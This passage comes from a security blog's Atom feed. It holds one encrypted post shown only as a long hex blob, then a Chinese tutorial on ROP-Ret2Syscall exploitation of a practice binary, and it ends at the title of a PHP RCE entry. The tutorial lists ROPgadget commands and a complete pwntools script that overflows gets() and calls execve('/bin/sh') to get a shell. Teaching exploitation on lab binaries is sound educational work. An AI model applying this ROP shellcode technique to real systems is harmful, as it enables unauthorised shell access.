9d52dd1c42fdfbf70c8d31ab03e3f4139a68cac2b2a1f889bba1f10b9ad65d14eb02b90c59fe2376aa38dff97005eb49ce719d3afc04796bdb83b9431c62623a1db53d599feb8659a4d45ffae790541ee91fed997c55d4f8944b61260f4b3bf9fb0d396f9111179e4506250d67856aef365f9ff8353e2f393dafa48fff3b56963ff5fdd380bfafd3c03c784b4080b3f16d143b9d515ede260e6436ade61d4c781406190a81ab9e52f26fd6c6716feb78926ea8e4291d4c6a41be94ffdb312f5ffa1dd2b0270281d003dd558da8c44cf9eff626ea12d34c5eb317f3dc9192fb6342fd85a6da5d8192ff74e3d050c08753f73d17bd2852f9fa3e44fea4fc51154475de271d2a2238c56959b4112187e86bfd6667e09bba5768b138376f48e82cedc3ef4bae013bd770a983d12c5ded89a33a688d930546d362f0cc17c59b9d7fdae8b9c178a44f43a2ee53476ace53b8b02163050558541e44b7b5349a309c3c5d6e7e73879ec97d928e9d58a960c77268f1e18734fd1d9339520f84120dd7d4a46de9f3c212d6f55e4605e95b2f7ae6b427e147b7abfe2924f80154ed88c4308bb6b150c85431ff4748469ea5ebfdda1810bce68f14070cafb3e49e33250195510d19983119218c36624d9a169435d588880d0b4d67516c3f8b422025511e2bba5f1bc495358d127bfca3fb17749a5e18a44b353afa30b8fe97741480abd2eecf1fa34e6e4ed4584dfee7b8acc69cdc3dd6717f715b6e888099c283284f5b296a03d681d2de2630e9af1a9912fb15687783b1b1ec8bcf3a668909191fb3a0093a6a198880e6c9efd842d3fe570b620024ceca3d8c9ff8b0ca1d4d943915532feeac0605df35efff3b5839b673e1085c30cc3044ec4a4c56c9373d893b84553e7b6d1694aec6cda5cefd1310aeda2caf62a5c65a565e57f32b25d20ba48c2a580af143dc71d3bc986271a34fe920424a1fadfa8c128581b5ec05ab08f67dd021eabfd342bc084ee5d517a2b75321ce5653b91f2b8b132e7ab70bd8d860c37bbbec2a156f1b9d13b7eb93547aef0b35926080be5479d1a0aff5a53213dbca0dfa32e91f2a6c1371235f30c8e3f13709640edd3132c914b7c125bf903f75933cd15cb5f2fda48e39e4f2ecbe200f4918cdb3df26bffb34ff654ab04e69f20fe7ea073634382336c893dacc90b2d62e4d9f83499ffdf3d0cf513b9b285c7a1f9e851c4246ea71e4792acc69f764295c02723442c593590a2f5b516e4a76ad7d0ded7f1efcd8294b17335fd2671a139947d66df07ba5208d11c2f4b1723b9c5dc61dd5e568d1dfcb8e79b9d0f70fe3945acff93f26ca4515fd6dcd1100dfeefba53f5c3af524176cc34f3b4946e19ab9558ee3c8ad22c98e835dad319033f69ab80590166a9b84c39d4c5018bfba4bedf83f418f2666b57b095090d300b4160b83fdafe7489d37908591029df328030195452349ab083df96b2d08d60346bb81bce4bf936a6f4f2121b7c5da5ce480b80ad7c43bad000f17afee6b1bb276dde6c5bee5e737f0705053693c408a427007e2e1fd6920541ca7360562fdbd39218445c712d59c6b30197b667d48e931b271ac3ffef42bfd3e3a9f7d1949cac73eeba9ed78f7ec83c15c8fe589f137ca188aba0e5692f900a8bfa902d82fd2d6cd8f9e689312230e6300d719bf14de4ea15e97c26ed0f83a89a7b936e41775516142df28704c3decb67469a9012a5c67d46ecd1783bf03bb8878a6755c934875be0c35f5cc43237a4766c299baaa476a076c455d299ecce3a08ea3023df7a7862985580bb5df9288179be1549ff26672bac4fc9bd80ba8d78a4f118b75647a930a9f5bba597b3f5e5d34072aaa08f992115dc0995aef27f3150e358d604c282ed3e190b740e7b10f9da0caa1f7ddb073536ebe292d9befe98df3f4bb52463a16808d7fd4811748014980481ffd794fd2e25b48db7f8bb5c089da66ceb1f478c03b7d2ff6f51702161d596cf33cbba68a7ce980220dbaea89558bdaaf09704e04976b8c3b7888fc9ee41cf3889d8e115f6f6b37292d97fa1a0b99542938fd127dc51bd5e5a7e42b36ff86e52237398015cdd258dbe43e3d6dbe192b69b3626562b711e9e88e7be4416a99c5ed8296470061eb86552d83adfff8ebf1566c07586c9d3f039578ed1744344fb374865c539dd677f995db34b375afaded816a6b8379b1f1084d6302825edc20cd382018901ef29c1c4086cc726aff3888fa72ccc6c640e1c73418a31ba8c43218b79814d5125e8e1f0ad0bb607e05473f9ad0f9567946133fb045320aa5d5e557683ebd2a08132bd87de933cab6d00f2961523d1b5ad039296d881fdb8182a4755b5f3be7702749c5e91837f74f7dcdc15e97cde41e6bbaee774eeac6d76f27ba9d2e99788178bd87b330c1131db1b040c335f00858e5d9caa0fede069821fb3530adea82981c6e6ccee2f025f5d3d55f6bf2c31b297bcb76adc11bab2950056949ca26a7a938e704cb29ce1a5bf99e9d6ebf3ad5df096d2042afd27ee20b9484cddabb62ef7843aacc224cf4ca467c27bafc14e73d4a3237913dc4a23f91d2d6a7b0560b6331cfe8db7381bf24cae7bf8507d2c4e8f9d27a67bdd2924bc85924dd172b3b6b9357325d4b555cfa3612c9982bebf3139ad3e1bd694338029341ddb3caa254d75272f07e4b0ba33f2d6399e336a68a93ed5a42af8a89a35fa55c1c263360009cf2bceef2717999f82aab11931878eda2b8138900e97285dcfc72da90541ba63fda603f95d56ba7e0555db69146c9f721cd925dcfc8c7896dbad47d73907ca4293f615e75f28a19e588260c2afb964afbfff999fbf17cbaef0257213f343934f7e4e16a1c1d34092d4ed5403e6f1aa9ee9bcfba2efe1ed5aac9c2b854ac8618dddeb01fc623f11d081594c79024574d68c41f8c1eb6ad8606e21dc52b099af9e57ccf420143f00a0e2077b527de1bc5ddeee3cf3b51624ce57ff9a65915c871b5b1bd4e8ecac4cc6a1fa4e9935f3a6d9498f248ee050d450ae75dd92a03e099208b306e7e2535806a7c4cc25f570f4843bb7026f00e63f4eb27727bc036e440e987297b1d7d8a65c01097b5f414c504aea0cd70f82bfc5bd9c83671c88d73fee9ddb335c1c33f7eb05f321e5047c7797116ebbe8fd977fe9b6868c4cef19e8ca8b570680b1d417b133731ef9f8f7efa0d9f0811f447fe8fdc4a42e0d25bc895264c00f1d9b51ce0515abb06ed3be45ee3e0ae055950b7e03daf02c22bdac5291ce9f9464793684791245525fdcdc22ebb18763a29273f44a51f23d95bbdf5d4b0cf667bb8bfef727ea5634e30fe9bfb4dede054ee2e2f69bef73fa5d7208dfcdc2e7f6be55f6fc6df20fdc5405f4f00fb744c95ee47e168694c02599184c04a5262ff3fc9b24deea1d8a638536625651af98fb69ff637550b19d015b2a8c87bbabfe04503b45e620bea4532d02702dbfeada5728a7a6acac921d281f49c707383de47f1bd8101db9d314124a4801817762c4bea2584d83a923da8fb2601f4359f1db598578a3736d541bb525ff9bc9bf00924be544b37419378097b10d90a2ad5d7d56328c9b74b83d8fe4d5086b65b83e5bf5da0571582d7084599c5db8a9ceed0a74905b493ba428de5f33be649209499f3994007d37142d2de1c8c8bce8ef6cbea4a779b7031ec6d46213d993562ef2f602e088af8e79d89ad3dccd101e1098968b6b5e465d241ab344670b5c2b3c7ca9605e62f593dc33406e49de5bb2419a884139c1d61de46bab459614275026d67dd5c0ce22354fe9794315e76a5f7fd5a9d5aa28f99876a05a01fdbe252db30417cb2e249c31bf82477453b30a11bf068dc368fd48299cbccdbe84a0760a70bf1ba01b7d673e1c05abfa5a0af9b98875ff71a8e86ca36626ea5c360e6e014efc3cae94a09f12ce518d0d7ab73e83d57bdf57b8b79c2624ee865bef4bb8b2c79eb63d0fafa5dec6e8902dfe6a03b9e13e6a93460645166d92806da8542669babdd081215963b1bea74e0c0dbd5161ba7d4510816eb1bf5535f88b870bade2b823bb1a788c94cde00a7b409d49bad319e64e075f687e0111af4647ef4061f9316564f7a1afa8b7b990aff6e28ab532966df4df3cc37e13194f026d0e8b8d973307a3071f0a1384dcd71636199c7c7c23bbe6ffd859c761307b997a0213ad2f364ad98b084051fedcd891478f30eff1e8e3e00029d963bbc7fafd216e1eb9846c2b9818caaedc2b111114896b0621ecd4e9cffa55c6f7258074702a31a1297c4ac8ae6e476945924a4152909b40171e92f21662ec5faadd32ab7227033e3f01f16aa602c17c192c95f704551b201edfde9ccbc5321d5fbbb32fb8a56c5a139f6dc7bc5d1dd5ddb5a9623bceb9c9bef3b406b4eab964a7bfbf5f42d8ddd4aef476d29b22a2a3a4a3a7b3826dd7fcb84a9d847a1961f0fcf4b528a2efb1bb21eee706080f97185633d076147d2747b016c2acb2aa42fea4e947a52f60732ff1a2a3f852a4a75777a83e8986d689beda45e25361953794708eb93c94322bc7ea6dbd15e8034d276b76c245adb09bdae097adbde2a449defb48a8c37d4ed79434e70feaa49308340298a969cfb023404158ec038ae4ba60895ea4c92f5490aad2844ab26d924ef6c2c280b33247f77e45993cd13d0a68ce33c7556da6063b93b3822c72b53d9052dfcf3ecdf6e37a96ee828d8bd62545f0d789f2cb0c7d5217141af1581e954a63328019db54ef3319d6aeb08b1c4eae91f69677a70140f6e9feec565b50d4c9445f077cb7e779a723b65215325053386c99b59ffebf86546fab8333213f189df9ede83c74270ac6bc46babf17530851b9574cfb102114342a4b848f67fe83b71629f209d063765e27314c12108069c369cd450392b32d80aae56a29aa6be0ef3e3cc7af0382c0e870ccbef62a66265e2c3f17ac3c79e190a89ae6995e0427f57c34b9e86fced97f9fc851095c973e65e1845f75ee8028196a432abcff7fc4360fad2c58f7c833b5eaf91af4ba8f2c163f838aca9e9931e4a4432660bb09c00260d6f9aff7b67b1d63260137299cc529069d181cd9fa5510334fff3c1902ce1c5a5a6b4ad2a6de3f82196fc7cb2b7818a473c88397c16bd22c3ded809868dff7d850b26182aca150b27e9bf65a3555c46d781cf32effc2930025dfa3ee46c8e1d8b1b3ecd5102e2248ade589933db579e4b6992a439af760ede90942e201393aada9e7baf7d007618886ab264fb7927c2b9b91b5db073f87eed867caf785c041422bc2b8a5e4b081678b411e124c6565ae04aba71810d139e898e3b54b142c3b1261c3f342db5ac1edb68aa9f71146cd081383ea4712c1b2b680b3daa919ec1e221867990354a3dd009ab15e96f3398ac7361393d41e9e384573ec901217d48623682649c163546a584b0ee4f5d627198bf88d962cfb69526bfc32fbd37513908989c7e7a6c64a5794a31ea7973f13cd1a0ffe428e80a1f8d586720b0a50bcc32bb118b61bbabea1138079d38655f804aa2069c4c3060fb4dbe2d325b3b0dca6125be0ed4b2708d40b7667723527c7c0289a212bf6ec7fbbdf7f1c4c16eace46cb1686f0c4831d6b1bfbfe3fed7d0f5db7f5da2effff6430e8a907e50024f209da4eeadf9d7e322f4782d49f106ec9d0180be3a1cdc5e5ea138a4398bb98c59d7eeaa996ddb059b7aba58e264282787363f031d0e7fb07e90e8534ec7fbc896615adda6f7767453400641a0e7a57cbec13cb14a35db4d233218dcf1a35f8df1c366a3e44631baecfe6cadabbe7f968ddd01c88cab8e94c603a2de8367234553eaa1c347c40cec8049b7f4e1f85e930b3fce867afeec52edc11b9096a86c329c1f7328d33aee7b19c1294c370cfaf4caab1d041aed25bde3f6bfc79005f2445894c72b0a8365d1df9505bb5803cd1ba2157ce4f8b498e0d0701ce4d0fe03a3fcf81791411e98d27e2174dadd066109e0db0f9c75012d578bc5cb8c44d37d14704297dc08d13f3cd274a87515d1f5bb7d62922831f25004e51bb1a419bac042e0be61e7845ce081df136fec7fea90494738d3d791213f6e05d52c4a8c32b4c3ce47155051e3cc67a0e8f58a5452661d494adc9b5bb743bc04a1c243b6de5ebf7c8f11c3c2ed2ff28ed0a1abdf6370fdbe8e0575f282dfbb8e7c31d7d329410386ef81471d22bfb238c8a08c9ca234bdd1b48e28dd29b7dd7b16b79e3a2c139dab76cddf46e641acc5a911e0c496e674472f588fc9e95b3850e5e5af4fa12913285ff298e57774c69651dce4df6008eb0da63947324bbf88f067d9b7c99d07d818a954f1b122cd4b0a5cc2b59e25a3f8e418ef581aabcd64a39f516f56ba2bf01e48f23bd6d96e07cf4c7f36cb3e39c009942abd27398185ca56a1a3d99d293d5d192aad89bdb87874f5a295074e77ae1322199b43f828ee01c2b6afdc8e5294b2bd25166690f77496f1cff55c7cad74d52678bb66e7745fc001c1b6a4263aa7d9a8741f82de73111147384f8e777b8bfff69dce4fa5811c864498bf8178e725a7c30b00e0a29518038aaf7a912dc042019495ee360f42450e5ff2317be8347a80b34759e514f2f0f19a9110f00356c6733eea7681326a1755724bb7f195f86dc8cbbd308415f442b963b42bde81fe733774dfbd4e148599d35cefb1ed97b9cea777b065b316e3550bfa6a6a156e33fadccc1e8f2f9db31f76141cc0e5e14d87b6f6b79878ecc3302a26429813f6a82fb1ec0b85b3860a95a600ce85004ca306a41613544b3d07b7e241337ffbad28d30a7d951c198d42e2ccac7f7aa437a03a8c436b8699772318a43659cccb9aed9a957f41ad118c4d4310f8e79d657696be743c3ed93a420920f237e9135883a5530807b2df80c5c9dd250e921aade0054982f69da109d74a7ba032d0bb202edc40332cecb0ece68682383f82f330bf778c8fc9380a366b42f5d29511e71fdb91a546309d02e2ca987c3436b72d708284afbfe1af70ff0e2912fad4424dfb3fc0615aed549ad3c52d5ca84d3ecc8546f6eb59f9a2e3f0da3b0708c2eb07b2b2de2643086c7d58f0ca1849d4cc1c402c9650a9760b723cc9dc3aded149290feb39281444549c9c310896e8b4280cf966c370af538c142a17172702b3f7dab0b038b128134b424e41c181caf5b1aa9b17d2c5fc06255c11d71f283cc49a0f6c8f268fad5d8bfbd76219f39318a295a0eaf4da0cee5fe5c9dbadcc7013f85a4c5257adfb4aef6f418d06373ec6c0547b3724ffc5b70f387d6056d1dca0230f44f33e0e19e7fce85be9359337a3058335f19d72da83eacd2e29fcc645bd6d0f94fa250469708f2aa29b9a8395cf6587053cdf9a0fed84bd4dc2441f6dfbee0f812176e4502adcaf6d753cd975b76186875047e17c18533aef988f41c025c96e7a905d5641253ac0e94e78cf2dea31a4217eae5273f1ae6ff204fae30d575c7b63393b600643165953faf454fdab301ed290deb16e7b00ae08497a5bdf750fe319676180eb87943deb76a1e015665b3f200b9543f1eb12e50b6ee1a830be7ddeb3bd7b6fe975fe3213e0749c7a83d76d87d02b41534aadf36cd025f0b05ffd0dd059acf8beb8dc3bb12347a2d87f61b2582d9960260eea5b6f2dc19f2114e17216d10e50b7cacff7e2b8d7fdfb4a0796346eb784288f4bf5d60f22d3fca9824ec67c02dd1f598f69897fe3110aea89058b6ed4c4b9d7293e2ac0d8ddd4f33522c335fdfdb66acd9b989d0d89f8a104bd6b4678b2bdd780b1355f79c9bf828a6e471a8c946b795f2415df759deebe36c29e089dd1cd6a64765ebf39291cff25067d643830d73e9fe20362b1e72687cdbcfd87075e034ac52d4d022cd590079fc7959841038cde84123619cdffed03c7c19994739a59b2521b050d740aba3758b1e93b5c7da9ba4c95936e0a7083bf6644b4e9dd8ed32591d08dc2767721e7fb5342833c8eb178003af4db3d7ac2eff797bedbd936e119b74dae83732d87daa730b70d29f13af9c0c2f53ef94bc9c654f35f8b87a3e657f16bea94b612d64919fb37535515756aa7dae92b02963fa14d1720b5d4e200ab134de505241ce8aec4d305031ded9e06cd536c6b113ae211c469906a35cdcd1de113201ad172c4af8658a8aa5d558e4582ecd13c0cbb481f4bcb68ee1bf67ea9c3650573df3c2dac8ea7fc540acb32533a7fb17c96b05b20b0bedca831b1671d4091cd9a7305b696c16de31826fb8d2168b90c365aa0666d60607692ea1a4d89596369505ca6b64e86d321e6f66c4ad881936f2a3f60c28675b6a1c2618fe7048f28105ead9d62f06b41ed625edaa1bae681d1b6a251a8479b71edf25ac84748e31a9b8bd1e8789c9360648239871740266c7d2b9f178c16ba470b328fd06498d51ba8db58f5cd80770e190c3b136241bb37b368eadcbe9ecbf38fe10215dd91f559e11c44b8c6fb3c21f8e4590391758ab32a3fd87eb4b21348cfc2c8d4719d228bfa2b1ff33d8b37dd628ce3835028d12b75b10c771a8d718e12a8162cd08f5827635781f9ed86251d7789cbe865704926cf1c26e4598ea676b386008f5d5fc2d7a4f1363e1dbab111b591d93bf1885caf8926d3683d6c416a80cb389c207ade4e6f9e5a2c8a4ca70bb51b33f26abeea61708b2fa36f0e0ed746921ef853c422f396b4fa8db79d3bbb41d2e5fc5060b8cb0aef31e6ba829b37c494f8b8d662ac2e6e3d4261e90ad2972189887a6ffe777bcca39341f8151758926449ed4907c5d8427b9d464e63f601757f9199f5909c6426111320b9882f2a00085500ca167af374f96a8b1ae3aecbed649de46abef14c824dbe8184a4643b743767e3e2a0f0f5f5591f0f9193597834df030ace9b501a90e4c26377da8af3fadf5012c1e9018890c3454d35fcd1b6dda12cd17e5f1e8d8091bf97855b24d6dde694c2adcfda418be3a2c952dbf316f7b1035f803a14f6e6e8b7ea65b8b01233a8903ebb295f46a6621139a45f086c7341799a1b167411afb784b4d63f9bdb6a9f1443de40f20f072cf4f67516c821a31506213aceb212e429c6d1206eec6dcfa693525020fa9d15bd4e150f7305924e7cc929e0d4a20919074a404de55c4d97320f9639a5e29d4d94f3347cb6cdb31b7af06fd126d16d2f4b8592622cc09154498287d39ce0f8090996c7f1d2fd9eb7cdedeb29ad5129e541c4c485ea52ea7db41d0175fd58bc4f4914d162f86b69bc1dd9d17d09b45c5dbe0648e62762a7c9f7f0a265b6426e0834c25c4f22bdf75b40c41ac070d5464aa3e7d419a56a26d87ec939412b3cdaf488e438a7b1d05c2387401037c91b63aae5e9668382c1ea258dcf0117b619e097504255319768d8c47ee5fe415135d8477e49cc69b0cf5d8fc76e1e4a751ca3832a4902d4d8bcce482804d6e567630bcb8570cad7608b105388761e53fc1853c7dbdd189bd12f71de0bd12fa09a6dec2d58ff30f66dc839011d4c3804bab5e4a4cffea52040fc100cc41ae5f9801ebd2674a04ba96f90335a680e4bd2c11c26ba82ae01ed1dc20fef6f547c4a43149aead3f9600fdf71633b19fe23302e17720d5dac8f077c1b6efcf9d1b08ace8210525636faec647b3bdc84998fb9c83c73d79872276a29c966e35c436812155b807c7f87a1939087b02c8e8e2d770d27c8753cc206e010c1373da7655bc99c7c682fd99f31dc9e735d0f1ef60e9dc291b437ac3b4e507ae55734a44efac286e8f1fa28802587db46753b27e92de28acea370d366b40e68eaddcd5ccbb087f8e4aec3e6ea6b68108b4fa3be02a5356b299758ae8e80d7784952bee67b01a5e86cb0f6796c94fed807c0fc5d68cdd7edf4f7aff32f8708f5fd25d5eb3fcb22ed0e30470381bb3cce1ca16ab310dfbf9004988430d5aa92713799ae3d3892a3696a9485910d44cbd0421fab8a753d6eea6f868eb798ef2a42eab8cafc12fba2478d40e8d4c2595f64ef42628b6ddb5182663ac18fbbb06081e8ee4caeea581b2dcacbc5442e15d742907436da728e94cdd4a91b0fd8c666564447b1d9edccaa8e23e1f78fc10ca8a4b0604ef7e9cbee2cd53852a1ce310d4d3fb74ece117a87ea86ba4931f97f59f515f7b4cacdebd56321780e8ea09b81781393e55091164e3e8216396afafdcabe17588f6303ae7ad016af3b55c0bd2f7ccf232d86cf1652da3e45ca4d6846584b83bd08b6d502e8c3203dd5c29a14da2ede61ec79eff9071a5ee93bafdf485e0a40b0101045203fd72d4620c6968c9f9be319ff5644be6a60e773c008d62ae5b2ddea99229a251bc663b1a074b0fe8973734b5a10159d5260130380650ff6c8f2ef9de621add6c75e31cefad49409800412bacb2a69b3e8a102dff99a0c864c6277475befb8fd06ec9d5ee8904007b3321c0c1a569537b94ea00085302ce00d198644817fb55eb56acadbc0f6e7694a12964c852da1139b7f41c5b447700d85ab7e6ddd405dd90bb4a1eebf9332591ac97d5f53b726ef05b9b73357c3a88cad43ebcfe54fa7e19b87cf406d2abd35511a4d7c6086e5c6ec811b0c8d2acb77f4074735a2e27caedd0e91d480c27935ce3ae4372a7779100e38bfc54c3875b0be6e22e5eefc128181091a9ea5f0df8a7f33c1e7d63c8b008051f80ccc48cd4d116206a9d282ba68747abab85665602d2bce27b9a6032cb5c2699e1db91dbb865616f3b05390c2094a4a56c737e51660c15b7fffa2f6f1019794b9f24dab7b310b81e5cf72d98db81db7bfd9ba15f83e796d45e6cd89f89193723b5f3896bdff8c23042adb1b80af2aedaa49fe2925d87ca8d3e3bcf08c8be4d4af3ce56947b3104d011ecbfaf015b095d466353da193e568018a5fdb0aa29f7cda485f3b502853582398cbb5b5b5974ed64c152d955d9e2c003e5b87433e515c6ea01dbb26992713c25eb7ed5ff5452d4726bbb4e4f6ed1a5c765414d038ce9d503da98acbae689e7e89aeac1bfb3934f45e7c5ce520a2063a0f0747a2ca32e59db9e28d7cd3af70ec62098cc295205e48a505c806d006c058788ab94622e12cbbfc17034a8274b748888ab593c145bab2d71e7fee83a4938ab07061b3c596ef98a9585b0d06f11d4f6aa8462fa7db71f483e2a641b1814fe288668ea3409fb48d264ee6dee1efff3e99d617c70197a4289341cbf28937606a0fd57019c412205866a09e4e69ea6067495149b40c1d60825c05e857f12ac611eea4214ad7ece3ea0c97528a1dc060d6d22260a4e9b254dd86c599d8a754508cb63b9881852592890bad878037833aca3634c0760b763bb1a1709012a64dde253f3417df88708ec0c916a6e80be7057982bce2cde4d1a74114888bc0c7f936970c0a002a4ad95cc3569ca64efeb5764e37f09c09845a81b7d310ac74277d86750a738ad056595918fef5dab31e2d8abce41028ebc1252f3057cc63b78a18f9647a29c2a4aa5db3c5709ebe19312bb33a76899a5fb1a138caabd9a3e05457f08a8992c9911cb6788ecc65d67cf5d7a17cb9e23b1763b30094189c5466e9bb7fc1a5d5e84723380c3299275039e683e886d46075c3c6f817984038946f36afe6995573fbb08045e551e0983df1c260dc971a2aaddc463231cca9c072366b2e2b14e77474bbeeb1ec0a4d026258969f34bc9f45a8c7aba2ab2e12133557e1d556fd97a10d70f38c8fc4ba7383dfdd70bdcc8519976c72af6ea8c94fee3be376a30cb8cf16a7e5031b75637b09ce59ea215d8b5b22f340bd41a3f7983b70f51102a5e1d5ad1dd192731f14ae6db011443f6c7ddfaa80f363205aaf7890e409f6c671e6baaa7292209a107b9c76db07ed03b640558b45ca7773d8ff9d591a758120f0244250ebda29d05762adb6900a4d098dd27c959822a9f8445c2538cfa722b1c65c30183eea88657d1bd6459d936e6e77bbcc1de07191d7f909b249d95d4d1e59c32eef4b2df998c6801a034c2c775905327c95087ade880d837101f79ac4e382d173bc085fefd8441652a797ee01a6b0c8174eda940087869d61e229b38bf9233c63598bf00af54c7d18dfa3365dcf750c07857807ea8205fbc75abd4b4782e8abb50724c576868f680507a4124de4a4f6f007e5b3c249275aae6a4d6b84cd7835034dc6390702716ba87e4e9c05f27eb558f2d879867f92667118fa1931c9059a0076c54d1c04097e315ac07b3ef0065d3f178d6cc00b0458e13a257c41e804f94958dfc9c9bd8c169c0f2f3146d6311d6b2ef667520710d61cd28cf06988882a05009c96c85488c1ef65db02759ce00121292bf5d2108a7a299f6cd11f0cba1e2d178224d194929dc915c0093ec3e6a8adc2139d866343c084df2e90d3c7975d40563f522952432a338b05407057f442c2749d7541243e92c3bbb8aaddd521e833401c0b4a89626f838a0e5c6ce4a76d6f5a46f7aacc7ee340c1a47f099e4cb78c6d597f86389bcdbe24e549dd4def0fab8c88c05f542d424e1ae921153356d118ea6ae2bef96ec3c21fb587c1f6ff56ca7cff80d8f63a6be1d1e1180665131f0dda396e5c0182e11826bfe1054736b993dec785e2c97287fe51009641d2a5efd7e2a175aeba0d069c3f5436bf0d562e916496cf8ba6ca7ed81ad245247632c75609bf0941bd6873c165085506e64f27b12352b672c722d10e972da34a0038b9c27b3571f905d0fdd8ddeb65424d72e00f9395a68d20b7da48ea40ac9388e571ea457b78f5182aeef5c71f260ff8b755084f6698cb8c0128824a52ddf5f95474e267def906e899a7010cf53476d42c5f3a82469d8aa556fae046906c89f2f2c5f3a4f6f9</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ROP-Ret2Syscall原理及应用</title>
      <link href="/2020/03/20/ROP-Ret2Syscall%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/"/>
      <url>/2020/03/20/ROP-Ret2Syscall%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-ROP-Ret2Syscall原理"><a href="#0x-01-ROP-Ret2Syscall原理" class="headerlink" title="0x 01 ROP-Ret2Syscall原理"></a>0x 01 ROP-Ret2Syscall原理</h3><p>ROP-Ret2Syscall意思是调用系统函数来获取shell.</p><p>这里在讲两个概念：第一：ROP(Return-oriented programming),是一种基于代码复用技术的新型<strong><em>，</em></strong>者供已有的库或可执行文件中提取指令片段、构建恶意代码。</p><p>第二：Gadgets是指在程序中的指令片段，有时我们为了达到我们执行命令的目的，需要多个Gadget来完成我们的功能。Gadget最后一般都有ret,因为要讲程序控制权(ip)给下一个Gadget。</p><h3 id="0x-02-实例分析"><a href="#0x-02-实例分析" class="headerlink" title="0x 02 实例分析"></a>0x 02 实例分析</h3><ol><li>伪代码</li></ol><p><img src="/2020/03/20/ROP-Ret2Syscall%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200121225903103.png" alt></p><p>第八行里又一个gets函数是有溢出漏洞的,使用gdb里的pattern offset来获取溢出偏移量为112</p><ol start="2"><li><p>我们知道溢出偏移量了，现在我们想执行命令，例如execve(“/bin/sh”,null,null)。此时要设计到Linux在调用系统函数时的用法。</p><p>系统函数调用的指令是int 0x80,这是固定指令，他有四个参数：</p><ul><li>系统调用号，即 eax 应该为 0xb</li><li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li><li>第二个参数，即 ecx 应该为 0</li><li>第三个参数，即 edx 应该为 0</li></ul><p>如果你学过任意一门编程语言，可以理解为int  0x80(eax,ebx,ecx,edx)。可能会有这样的疑问：为什么是eax,ebx,ecx,edx要设置为这些值，答案是系统在运行的时候就是固定的要读这四个寄存器，如果不这么写，就不会调用到execve函数。</p><p>接下来我们就要一点点的去拼凑这些内容，我们没法直接在栈里写指令，只能够利用程序中自带的指令去拼凑。</p><p>首先我们将eax设置为0xb，我们是没法直接往栈里写mov eax,0xb的，那么还有另一种方式是pop eax，但是要保证栈顶必须是0xb。</p><p>然后设置ebx,ecx,edx，同样是这样的道理，所以我们可以想象栈中的数据是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pop eax；ret</span><br><span class="line">0xb</span><br><span class="line">pop ebx;pop ecx;pop edx;ret</span><br><span class="line">&quot;&#x2F;bin&#x2F;sh&quot;的地址</span><br><span class="line">0</span><br><span class="line">0</span><br><span class="line">int 0x80的地址</span><br></pre></td></tr></table></figure><p>这样我们就可以保值eax，ebx，ecx，edx的值了。</p><p>所以接下来我们要在程序中找一下有没有pop eax;和pop ebx;pop ecx;pop edx;的指令。</p><p>需要用到一个工具：ROPgadget</p><p>ROPgadget –binary ./ret2syscall –only “pop|ret” | grep “eax”</p><p>–only是指只有pop和ret指令</p></li></ol><p><img src="/2020/03/20/ROP-Ret2Syscall%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200121230259021.png" alt></p><p>我们使用0x080bb196，符合我们的预期。</p><p>接下来找类似pop ebx;pop ecx;pop edx;的指令</p><p>ROPgadget –binary ./ret2syscall –only “pop|ret” | grep “ebx” | grep “ecx” | grep “edx”</p><p><img src="/2020/03/20/ROP-Ret2Syscall%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200121230412710.png" alt></p><p>恰好也有我们所需要的，只不过顺序和我们的不同，在组织payload时候需要调换下顺序。</p><p>我们在找一下字符串“/bin/sh”的地址</p><p>ROPgadget –binary ./ret2syscall –string “/bin/sh”</p><p><img src="/2020/03/20/ROP-Ret2Syscall%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200121230506453.png" alt></p><p>地址为0x080be408</p><p>我们在查找下“int 0x80”的地址</p><p>ROPgadget –binary ./ret2syscall –only “int”</p><p><img src="/2020/03/20/ROP-Ret2Syscall%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200121230556764.png" alt></p><p>地址为0x08049421</p><p>所以我们现在有了所有我们需要的内容了，接下来写payload。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;ret2syscall&#39;)</span><br><span class="line">pop_eax_ret &#x3D; 0x080bb196</span><br><span class="line">pop_edx_ecx_ebx_ret &#x3D; 0x0806eb90</span><br><span class="line">int_0x80 &#x3D; 0x08049421</span><br><span class="line">binsh &#x3D; 0x80be408</span><br><span class="line">payload &#x3D; &#39;A&#39; * 112 + p32(pop_eax_ret) +p32(0xb)+p32(pop_edx_ecx_ebx_ret)+ p32(0)+p32(0)+p32(binsh)+p32(int_0x80)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>调试程序参考：<a href="https://blog.51cto.com/11797152/2379740?source=dra" target="_blank" rel="noopener">https://blog.51cto.com/11797152/2379740?source=dra</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ROP-Ret2Syscall原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php无参数RCE</title>
      <link href="/2020/03/20/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/"/>
      <url>/2020/03/20/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/</url>
      
